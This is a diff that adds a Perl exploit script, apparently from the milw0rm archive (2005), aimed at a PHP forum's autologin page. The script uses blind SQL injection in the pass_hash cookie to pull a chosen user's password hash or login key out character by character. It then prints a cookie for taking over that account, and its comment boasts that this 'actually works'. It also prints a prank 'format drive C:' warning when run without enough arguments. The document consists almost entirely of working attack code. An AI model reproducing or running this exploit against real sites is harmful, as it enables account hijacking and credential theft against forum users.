@@ -1,0 +1,67 @@
+#!/usr/bin/perl -w
+##################################################################
+# This one actually works :) Just paste the outputted cookie into
+# your request header using livehttpheaders or something and you
+# will probably be logged in as that user. No need to decrypt it!
+# Exploit coded by "Tony Little Lately" and "Petey Beege"
+##################################################################
+
+use LWP::UserAgent;
+
+   $ua = new LWP::UserAgent;
+   $ua->agent("Mosiac 1.0" . $ua->agent);
+
+if (!$ARGV[0]) {$ARGV[0] = '';}
+if (!$ARGV[3]) {$ARGV[3] = '';}
+
+my $path = $ARGV[0] . '/index.php?act=Login&CODE=autologin';
+my $user = $ARGV[1];   # userid to jack
+my $iver = $ARGV[2];   # version 1 or 2
+my $cpre = $ARGV[3];   # cookie prefix
+my $dbug = $ARGV[4];   # debug?
+
+if (!$ARGV[2])
+{
+        print "The type of the file system is NTFS.\n\n";
+        print "WARNING, ALL DATA ON NON-REMOVABLE DISK\n";
+        print "DRIVE C: WILL BE LOST!\n";
+        print "Proceed with Format (Y/N)?\n";
+        exit;
+}
+
+my @charset = ("0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f");
+
+my $outputs = '';
+
+for( $i=1; $i < 33; $i++ )
+{
+        for( $j=0; $j < 16; $j++ )
+        {
+                my $current = $charset[$j];
+            my $sql = ( $iver < 2 ) ?  "99%2527+OR+(id%3d$user+AND+MID(password,$i,1)%3d%2527$current%2527)/*" :
+"99%2527+OR+(id%3d$user+AND+MID(member_login_key,$i,1)%3d%2527$current%2527)/*";
+                my @cookie = ('Cookie' => $cpre . "member_id=31337420; " . $cpre . "pass_hash=" . $sql);
+                my $res = $ua->get($path, @cookie);
+
+                # If we get a valid sql request then this
+                # does not appear anywhere in the sources
+                $pattern = '<title>(.*)Log In(.*)</title>';
+
+                $_ = $res->content;
+
+                if ($dbug) { print };
+
+                if ( !(/$pattern/) )
+                {
+                        $outputs .= $current;
+                        print "$current\n";
+                    last;
+                }
+
+        }
+  if ( length($outputs) < 1 )   { print "Not Exploitable!\n"; exit;     }
+}
+print "Cookie: " . $cpre . "member_id=" . $user . ";" . $cpre . "pass_hash=" . $outputs;
+exit;
+
+# milw0rm.com [2005-05-26]
